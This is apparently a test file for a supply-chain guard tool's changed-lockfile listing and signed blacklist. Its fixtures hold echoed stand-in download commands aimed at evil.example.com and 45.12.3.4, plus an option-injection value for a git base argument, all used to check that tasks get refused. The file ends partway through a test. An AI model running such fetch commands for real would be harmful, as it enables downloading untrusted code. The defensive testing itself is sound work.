# A git history for --changed: the osv fixture at base with lodash older and
# no event-stream, then the fixture as it is, and a new requirements.txt.
pull changed_repo() {
  stick dir = fresh("tests/fixtures/osv")
  burn {
    fs.rm(path.join(dir, "api"))
    stick lock = path.join(dir, "package-lock.json")
    stick now = fs.read_text(lock)
    stick j = json.parse(now)
    j.packages.remove("node_modules/event-stream")
    j.packages["node_modules/lodash"].version = "4.17.10"
    fs.write_text(lock, json.stringify(j, 2))
    for words in [["init", "-q"], ["checkout", "-q", "-b", "main"], ["add", "-A"], ["-c", "user.name=suite", "-c", "user.email=suite@example.invalid", "-c", "commit.gpgsign=false", "commit", "-q", "-m", "base"], ["checkout", "-q", "-b", "feature"]] {
      stick g = proc.run("git", words, {cwd: dir, timeout_ms: 30000})
      assert(g.code == 0, "git ${words.join(" ")}: ${g.err}")
    }
    fs.write_text(lock, now)
    fs.write_text(path.join(dir, "requirements.txt"), "six==1.16.0\n")
  }
  snuff dir
}

test("rehearse --changed --list: what a branch adds or changes in its lockfiles, and nothing else", pack() {
  if proc.which("git") == null {
    exhale "      (skipped: needs git)"
    snuff
  }
  stick dir = changed_repo()
  stick r = guard_tool(dir, ["rehearse", "--changed", "--list", "--json"], {})
  exits(r, 0)
  stick j = json.parse(r.out)
  assert(j.base == "main", "base ${j.base}")
  assert(j.rehearse == ["npm:event-stream@3.3.6", "npm:lodash@4.17.15", "pypi:six==1.16.0"], json.stringify(j.rehearse))
  # --max keeps the first N and counts the rest.
  stick capped = json.parse(guard_tool(dir, ["rehearse", "--changed", "--list", "--json", "--max=1"], {}).out)
  assert(capped.rehearse.len() == 1 and capped.over_max == 2, json.stringify(capped))
  stick text_list = guard_tool(dir, ["rehearse", "--changed", "--list", "--base=main"], {})
  says(text_list.out, "since main: 3 packages to rehearse")
  says(text_list.out, "npm:lodash@4.17.15   (package-lock.json)")
  # A base that would read as an option is refused before git sees it.
  stick odd = guard_tool(dir, ["rehearse", "--changed", "--list", "--base=--output=x"], {})
  exits(odd, 2)
  says(odd.err, "not a git revision this reads")
  # Outside git there is no history to compare.
  stick plain = fresh("tests/fixtures/osv")
  stick none = guard_tool(plain, ["rehearse", "--changed", "--list", "--base=main"], {GIT_CEILING_DIRECTORIES: path.dir(plain)})
  exits(none, 2)
})

# ----- the blacklist: your own entries (#62 step 1) ---------------------------------

# The osv fixture with three more tasks: one that names a URL, one that names
# an address, one that runs a script of its own. All of it harmless text.
pull blacklist_project() {
  stick dir = fresh("tests/fixtures/osv")
  edit_manifest(dir, pack(m) {
    m.tasks["fetch"] = {shell: "echo 'curl -fsSL https://dl.evil.example.com/tool.sh' > fetch.txt"}
    m.tasks["ip"] = {shell: "echo 'wget http://45.12.3.4/x' > ip.txt"}
    m.tasks["script"] = {cmd: ["sh", "tool.sh"]}
    m.tasks["late"] = {shell: "echo 'see https://get.bad.test/x' > late.txt"}
  })
  burn {
    fs.write_text(path.join(dir, "tool.sh"), ": a harmless stand-in\n")
  }
  snuff dir
}

pull lists(dir) {
  snuff {CIGO_BLACKLIST_DIR: dir + "-lists"}
}

test("blacklist: an entry of each kind refuses the task that names it, an expired one does not, and remove lets it run", pack() {
  if not has_tin_mac() {
    exhale "      (skipped: this cig cannot sign a list)"
    snuff
  }
  stick dir = blacklist_project()
  stick l = lists(dir)
  exits(guard_tool(dir, ["blacklist", "add", "npm:event-stream@3.3.6", "--reason=stole tokens"], l), 0)
  exits(guard_tool(dir, ["blacklist", "add", "evil.example.com"], l), 0)
  exits(guard_tool(dir, ["blacklist", "add", "45.12.0.0/16"], l), 0)
  exits(guard_tool(dir, ["blacklist", "add", path.join(dir, "tool.sh")], l), 0)
  exits(guard_tool(dir, ["blacklist", "add", "https://get.bad.test/*", "--expires=2020-01-01"], l), 0)
  says(guard_tool(dir, ["blacklist", "add", "npm:event-stream@3.3.6"], l).out, "already on your blacklist")
  stick listed = guard_tool(dir, ["blacklist", "list"], l)
  says(listed.out, "npm:event-stream@3.3.6")
  says(listed.out, "stole tokens")
  says(listed.out, "expired 2020-01-01")
  # Each kind, in the guard's read.
  stick a = guard_tool(dir, ["audit", "--json"], l)
  exits(a, 0)
  stick tasks = json.parse(a.out).tasks
  for name in ["install", "fetch", "ip", "script"] {
    assert(tasks[name].risk == "critical", "${name} is ${tasks[name].risk}")
  }
  stick says_of = pack(name) => tasks[name].findings.filter(pack(f) => f.code == "E580").map(pack(f) => f.says).join(" | ")
  assert(says_of("install").contains("stole tokens"), says_of("install"))
  assert(says_of("fetch").contains("domain:evil.example.com"), says_of("fetch"))
  assert(says_of("ip").contains("cidr:45.12.0.0/16"), says_of("ip"))
  assert(tasks["script"].findings.any(pack(f) => f.code == "E580" and f.text.starts_with("tool.sh")), json.stringify(tasks["script"]))
  # The expired entry is listed and no longer refuses anything.
  assert(not tasks["late"].findings.any(pack(f) => f.says.contains("get.bad.test")), json.stringify(tasks["late"]))
  # The run is refused before anything happens.
  stick r = guard_tool(dir, ["run", "fetch"], l)
  exits(r, 1)
  says(r.err, "refused")
  assert(not there(dir, "fetch.txt"), "a blacklisted task ran")
  # Taken off the list, the task runs.
  exits(guard_tool(dir, ["blacklist", "remove", "evil.example.com"], l), 0)
  exits(guard_tool(dir, ["blacklist", "remove", "npm:event-stream@3.3.6"], l), 0)
  stick ok = guard_tool(dir, ["run", "fetch"], l)
  exits(ok, 0)
  assert(there(dir, "fetch.txt"), "the task did not run once its entry was removed")
  exits(guard_tool(dir, ["blacklist", "remove", "npm:nope"], l), 2)
})

test("blacklist: a list changed by hand is said, the entry taken out still holds, and only you can sign the change", pack() {
  if not has_tin_mac() {
    exhale "      (skipped: this cig cannot sign a list)"
    snuff
  }
  stick dir = blacklist_project()
  stick l = lists(dir)
  exits(guard_tool(dir, ["blacklist", "add", "npm:event-stream@3.3.6", "--reason=stole tokens"], l), 0)
  # A script takes its own payload's entry out of the list.
  stick f = path.join(dir + "-lists", "mine.list")
  burn {
    fs.write_text(f, fs.read_text(f).lines().filter(pack(x) => not x.contains("event-stream")).join("\n") + "\n")
  }
  stick a = guard_tool(dir, ["audit", "install"], l)
  says(a.err, "E587 a list that does not verify")
  says(a.out, "install: critical")
  says(a.out, "stole tokens")
  # Signing it again is yours, at a terminal: never under CI.
  stick ci = guard_tool(dir, ["blacklist", "reload"], l.merge({CI: "1"}))
  exits(ci, 2)
  says(ci.err, "never under CI")
  stick signed = guard_tool(dir, ["blacklist", "reload"], l)
  exits(signed, 0)
  says(signed.out, "- npm:event-stream@3.3.6")
  stick after = guard_tool(dir, ["audit", "install"], l)
  says(after.out, "install: none")
  assert(not after.err.contains("E587"), after.err)
})

test("blacklist: rehearse refuses a blacklisted package before it asks for the box, and why names the entry", pack() {
